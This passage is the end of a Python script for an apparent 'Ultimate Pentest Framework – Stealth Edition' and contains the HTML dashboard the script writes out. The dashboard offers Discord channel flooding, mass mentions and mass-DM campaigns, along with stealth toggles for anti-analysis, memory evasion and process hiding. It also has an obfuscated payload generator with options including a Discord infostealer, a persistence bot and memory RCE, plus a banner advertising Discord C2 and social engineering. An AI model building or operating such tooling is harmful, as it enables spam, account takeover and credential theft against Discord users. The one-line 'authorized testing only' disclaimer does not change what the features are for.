                                        <i class="fas fa-bomb"></i> Channel Flood
                                    </button>
                                    <button class="btn btn-info w-100 mb-2" onclick="massMention()">
                                        <i class="fas fa-at"></i> Mass Mention
                                    </button>
                                </div>
                            </div>
                        </div>

                        <div class="tab-pane fade" id="stealth">
                            <h6>Advanced Stealth Controls</h6>
                            <div class="row">
                                <div class="col-md-6">
                                    <div class="form-check">
                                        <input class="form-check-input" type="checkbox" id="antiAnalysis" checked>
                                        <label class="form-check-label" for="antiAnalysis">
                                            Anti-Analysis
                                        </label>
                                    </div>
                                    <div class="form-check">
                                        <input class="form-check-input" type="checkbox" id="memoryEvasion" checked>
                                        <label class="form-check-label" for="memoryEvasion">
                                            Memory Evasion
                                        </label>
                                    </div>
                                </div>
                                <div class="col-md-6">
                                    <div class="form-check">
                                        <input class="form-check-input" type="checkbox" id="networkStealth" checked>
                                        <label class="form-check-label" for="networkStealth">
                                            Network Stealth
                                        </label>
                                    </div>
                                    <div class="form-check">
                                        <input class="form-check-input" type="checkbox" id="processHiding" checked>
                                        <label class="form-check-label" for="processHiding">
                                            Process Hiding
                                        </label>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <div class="tab-pane fade" id="payloads">
                            <h6>Advanced Payload Generation</h6>
                            <div class="row">
                                <div class="col-md-6">
                                    <select id="payloadType" class="form-select bg-dark text-light">
                                        <option value="stealth_agent">Stealth Agent</option>
                                        <option value="discord_infostealer">Discord InfoStealer</option>
                                        <option value="memory_rce">Memory RCE</option>
                                        <option value="persistence_bot">Persistence Bot</option>
                                    </select>
                                </div>
                                <div class="col-md-6">
                                    <label>Obfuscation: <span id="obfuscationValue">9</span>/10</label>
                                    <input type="range" class="form-range" id="obfuscationLevel" min="1" max="10" value="9">
                                </div>
                            </div>
                            <button class="btn btn-success w-100 mt-3" onclick="generateAdvancedPayload()">
                                <i class="fas fa-cog"></i> Generate Advanced Payload
                            </button>
                            <div id="payloadOutput" class="mt-3 p-3 bg-dark text-success" style="display: none; height: 300px; overflow-y: auto; font-family: monospace;"></div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
    <script>
        const socket = io();
        
        function generateAdvancedPayload() {
            const type = document.getElementById('payloadType').value;
            const obfuscation = document.getElementById('obfuscationLevel').value;
            
            fetch('/api/stealth/generate-payload', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({type: type, obfuscation: parseInt(obfuscation)})
            }).then(r => r.json()).then(data => {
                const output = document.getElementById('payloadOutput');
                output.textContent = data.payload;
                output.style.display = 'block';
            });
        }
        
        function startMassDM() {
            const message = document.getElementById('dmMessage').value;
            if (!message) {
                alert('Please enter a message');
                return;
            }
            
            fetch('/api/discord/mass-dm', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({message: message})
            }).then(r => r.json()).then(data => {
                alert('Mass DM campaign started');
            });
        }
        
        // Obfuscation slider
        document.getElementById('obfuscationLevel').addEventListener('input', function() {
            document.getElementById('obfuscationValue').textContent = this.value;
        });
    </script>
</body>
</html>
        '''
        
        os.makedirs('templates', exist_ok=True)
        with open('templates/ultimate_dashboard.html', 'w') as f:
            f.write(dashboard_html)

def main():
    """Main entry point"""
    print("""
    ╔══════════════════════════════════════════════════════════════╗
    ║               ULTIMATE PENTEST FRAMEWORK - STEALTH EDITION   ║
    ║               WITH ADVANCED DISCORD INTEGRATION             ║
    ║                                                              ║
    ║  FEATURES:                                                   ║
    ║  • Advanced Stealth Techniques                              ║
    ║  • Comprehensive Discord C2                                 ║
    ║  • Memory Evasion & Anti-Analysis                           ║
    ║  • Multi-Vector Social Engineering                          ║
    ║  • Advanced Persistence Mechanisms                          ║
    ║  • Real-time Intelligence Gathering                         ║
    ║                                                              ║
    ║  LEGAL: Authorized testing only. Use responsibly.           ║
    ╚══════════════════════════════════════════════════════════════╝
    """)
    
    parser = argparse.ArgumentParser(description='Ultimate Pentest Framework')
    parser.add_argument('--host', default='0.0.0.0', help='Host to bind to')
    parser.add_argument('--port', type=int, default=5000, help='Port to bind to')
    parser.add_argument('--stealth-level', choices=['low', 'medium', 'high'], default='high', help='Stealth level')
    
    args = parser.parse_args()
    
    framework = UltimatePentestFramework()
    framework.config['stealth_level'] = args.stealth_level
    framework.run(host=args.host, port=args.port)

if __name__ == "__main__":
    main()
